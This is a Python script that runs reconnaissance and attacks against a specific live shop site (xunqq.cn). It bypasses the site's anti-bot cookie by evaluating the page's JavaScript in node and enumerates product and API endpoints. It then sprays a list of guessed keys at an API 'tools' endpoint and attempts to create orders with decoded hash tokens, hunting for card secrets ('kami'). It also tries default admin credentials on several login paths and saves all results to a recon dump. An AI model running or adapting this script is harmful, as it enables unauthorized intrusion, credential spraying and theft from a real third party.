#!/usr/bin/env python3
"""Finish Rainbow probes: goods, order create, api search, login, extract markers."""
import re
import json
import subprocess
import urllib.parse
import urllib.request
import urllib.error
import http.cookiejar
from pathlib import Path

HOST = "http://xunqq.cn"
BASE = HOST + "/admin"
UA = (
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 "
    "(KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36"
)
OUT = Path("/data/recon/pfqq.net")


def set_cookie(cj, n, v):
    cj.set_cookie(
        http.cookiejar.Cookie(
            0, n, v, None, False, "xunqq.cn", False, False, "/", False,
            False, None, False, None, None, {},
        )
    )


def session():
    cj = http.cookiejar.CookieJar()
    op = urllib.request.build_opener(urllib.request.HTTPCookieProcessor(cj))

    def get(url, data=None, headers=None):
        h = {"User-Agent": UA, "Referer": BASE + "/", "Accept": "*/*"}
        if headers:
            h.update(headers)
        req = urllib.request.Request(url, data=data, headers=h)
        try:
            return op.open(req, timeout=20).read().decode("utf-8", "ignore")
        except urllib.error.HTTPError as e:
            body = e.read().decode("utf-8", "ignore")
            return f"HTTP_{e.code}:{body[:400]}"

    get(HOST + "/nasgo/")
    get(HOST + "/loading/")
    html = get(BASE + "/")
    m = re.search(
        r"setCookie\(\s*[\"']sec_defend[\"']\s*,\s*(.+?)\)\s*;\s*setCookie\(\s*[\"']sec_defend_time[\"']",
        html,
        re.S,
    )
    if m:
        val = subprocess.run(
            ["node", "-e", f"console.log({m.group(1)})"],
            capture_output=True,
            text=True,
            timeout=15,
        ).stdout.strip()
        set_cookie(cj, "sec_defend", val)
        set_cookie(cj, "sec_defend_time", "2")
        html = get(BASE + "/index.php")
    return get, html, cj


def main():
    get, html, cj = session()
    result = {"title": (re.search(r"<title>([^<]+)", html) or [None, None])[1]}
    print("TITLE", result["title"])

    # tids / cids from home
    tids = sorted(set(re.findall(r"tid=(\d+)", html)))
    cids = sorted(set(re.findall(r"cid=(\d+)", html)))
    result["tids"] = tids
    result["cids"] = cids
    print("tids", tids, "cids", cids)

    goods = []
    for tid in tids:
        body = get(f"{BASE}/?mod=buy&tid={tid}")
        (OUT / "probe" / f"buy_{tid}.html").write_text(body, encoding="utf-8")
        # price patterns
        prices = re.findall(r"([\d]+\.[\d]{2})", body)
        name_m = re.search(r"<title>([^<]+)", body)
        stock_m = re.search(r"(库存|剩余|件数)[^0-9]{0,12}(\d+)", body)
        has_hash = "hashsalt" in body
        info = {
            "tid": tid,
            "len": len(body),
            "title": name_m.group(1) if name_m else None,
            "prices_sample": prices[:8],
            "stock": stock_m.group(0) if stock_m else None,
            "hashsalt": has_hash,
        }
        goods.append(info)
        print("GOODS", info)

        # extract hashsalt if present via JSFuck eval of common pattern
        hm = re.search(r"name=[\"']hashsalt[\"'][^>]*value=[\"']([^\"']+)[\"']", body)
        if not hm:
            hm = re.search(r"hashsalt[\"']?\s*[:=]\s*[\"']([^\"']+)[\"']", body)
        if hm:
            info["hashsalt_val"] = hm.group(1)[:80]
        # JSFuck hashsalt assignment
        jm = re.search(r"hashsalt['\"]?\s*=\s*(\([][[]][^\n]{20,800})", body)
        if jm:
            try:
                val = subprocess.run(
                    ["node", "-e", f"console.log({jm.group(1)})"],
                    capture_output=True,
                    text=True,
                    timeout=10,
                ).stdout.strip()
                info["hashsalt_decoded"] = val[:120]
                print("HASH", tid, val[:80])
            except Exception as e:
                info["hashsalt_err"] = str(e)

    result["goods"] = goods

    # ajax getgoods by cid
    class_data = []
    for cid in cids:
        for act in ["getgoods", "getGoods", "getlist"]:
            body = get(
                f"{BASE}/ajax.php?act={act}&cid={cid}",
                headers={"X-Requested-With": "XMLHttpRequest"},
            )
            print("CID", cid, act, body[:250])
            class_data.append({"cid": cid, "act": act, "body": body[:500]})
    result["class_ajax"] = class_data

    # api search (handle 500)
    search = []
    for i in list(range(1, 21)) + [100, 1000]:
        body = get(f"{BASE}/api.php?act=search&id={i}")
        if "不存在" not in body and "HTTP_500" not in body:
            print("SEARCH", i, body[:200])
            search.append({"id": i, "body": body[:400]})
        elif i <= 3:
            print("SEARCH", i, body[:200])
            search.append({"id": i, "body": body[:200]})
    result["api_search"] = search

    # tools oracle confirm + spray
    tools = []
    for key in [
        "", "1", "123456", "admin88", "7229863", "1934131068", "985895",
        "vxqcc", "xunqq", "pfqq", "qqpifa", "admin888", "888888", "faka888",
    ]:
        body = get(f"{BASE}/api.php?act=tools&key={urllib.parse.quote(key)}&limit=1")
        interesting = all(x not in body for x in ["空", "错误", "不正确", "关闭"])
        tools.append({"key": key, "body": body[:220], "interesting": interesting})
        if interesting or key in ("", "123456"):
            print("TOOLS", repr(key), body[:220])
    result["tools"] = tools

    # order create attempts
    creates = []
    for tid in tids[:3] or ["1109"]:
        # get hashsalt from page
        body = get(f"{BASE}/?mod=buy&tid={tid}")
        hashsalt = None
        hm = re.search(r"name=[\"']hashsalt[\"'][^>]*value=[\"']([^\"']+)[\"']", body)
        if hm:
            hashsalt = hm.group(1)
        else:
            jm = re.search(r"([!\+\[\]]{30,})", body)
            # try find setCookie-like or hashsalt JSFuck near keyword
            for m in re.finditer(r"hashsalt.{0,40}", body, re.I):
                print("hash context", m.group(0)[:80])
            # Rainbow often: var hashsalt = JSFuck
            jm = re.search(r"hashsalt\s*=\s*([^;]+);", body)
            if jm:
                expr = jm.group(1).strip()
                if expr.startswith("(") or expr.startswith("[") or expr.startswith("!"):
                    hashsalt = subprocess.run(
                        ["node", "-e", f"console.log({expr})"],
                        capture_output=True,
                        text=True,
                        timeout=10,
                    ).stdout.strip()
                    print("decoded hashsalt", hashsalt[:60])

        payloads = [
            {
                "tid": tid,
                "inputvalue": "13800138000",
                "num": "1",
                "hashsalt": hashsalt or "",
            },
            {
                "tid": tid,
                "input1": "13800138000",
                "num": "1",
                "hashsalt": hashsalt or "",
            },
        ]
        for p in payloads:
            # classic Rainbow: POST ajax.php?act=pay
            body = get(
                BASE + "/ajax.php?act=pay",
                data=urllib.parse.urlencode(p).encode(),
                headers={
                    "X-Requested-With": "XMLHttpRequest",
                    "Content-Type": "application/x-www-form-urlencoded",
                },
            )
            print("PAY", tid, p.keys(), body[:300])
            creates.append({"tid": tid, "payload_keys": list(p.keys()), "body": body[:500], "hashsalt": bool(hashsalt)})
            # if order created, try query
            try:
                j = json.loads(body.split("HTTP_")[0] if body.startswith("HTTP_") else body)
            except Exception:
                j = None
            if isinstance(j, dict) and j.get("code") == 0:
                trade = j.get("trade_no") or j.get("orderid") or j.get("out_trade_no")
                print("ORDER CREATED", trade, j)
                if trade:
                    q = get(
                        f"{BASE}/ajax.php?act=query&page=1&data={urllib.parse.quote(str(trade))}",
                        headers={"X-Requested-With": "XMLHttpRequest"},
                    )
                    print("QUERY ORDER", q[:400])
                    page = get(f"{BASE}/?mod=query&data={urllib.parse.quote(str(trade))}")
                    kami = re.findall(r"卡密[^<]{0,120}", page)
                    print("PAGE KAMI", kami[:5])
    result["creates"] = creates

    # user login admin88
    logins = []
    for path in [
        "/admin/user/login.php",
        "/admin/user/login",
        "/wp/public/user/login",
    ]:
        url = HOST + path
        # GET form
        page = get(url)
        post = get(
            url,
            data=urllib.parse.urlencode(
                {"user": "admin88", "pass": "admin88", "username": "admin88", "password": "admin88"}
            ).encode(),
            headers={"Content-Type": "application/x-www-form-urlencoded"},
        )
        logins.append({
            "path": path,
            "get_len": len(page),
            "post_len": len(post),
            "get_title": (re.search(r"<title>([^<]+)", page) or [None, None])[1],
            "post_snip": post[:200],
            "cookies": [(c.name, (c.value or "")[:40]) for c in cj],
        })
        print("LOGIN", path, logins[-1]["get_title"], post[:160])
    result["logins"] = logins

    # query endpoint still empty?
    q = get(
        BASE + "/ajax.php?act=query&page=1",
        headers={"X-Requested-With": "XMLHttpRequest"},
    )
    result["ajax_query"] = q[:300]
    gc = get(
        BASE + "/ajax.php?act=getcount",
        headers={"X-Requested-With": "XMLHttpRequest"},
    )
    result["getcount"] = gc[:300]
    print("QUERY", q)
    print("GETCOUNT", gc)

    # contact markers from home
    contacts = {
        "tg": re.findall(r"@[\w]+|t\.me/[\w]+", html),
        "qq": re.findall(r"QQ[：:]\s*(\d+)|qq\.com/(\d+)|群[：:]\s*(\d+)", html, re.I),
        "yy": re.findall(r"YY[：:]\s*(\d+)", html, re.I),
    }
    result["contacts"] = contacts
    print("CONTACTS", contacts)

    kami = False
    blob = json.dumps(result, ensure_ascii=False)
    if re.search(r"(卡密|kami)[:：\s\"'][^\"']{6,}", blob, re.I):
        kami = True
    result["kami_found"] = kami

    (OUT / "dump" / "FINISH.json").write_text(
        json.dumps(result, ensure_ascii=False, indent=2), encoding="utf-8"
    )
    print("KAMI", kami)
    print("WROTE FINISH.json")


if __name__ == "__main__":
    main()
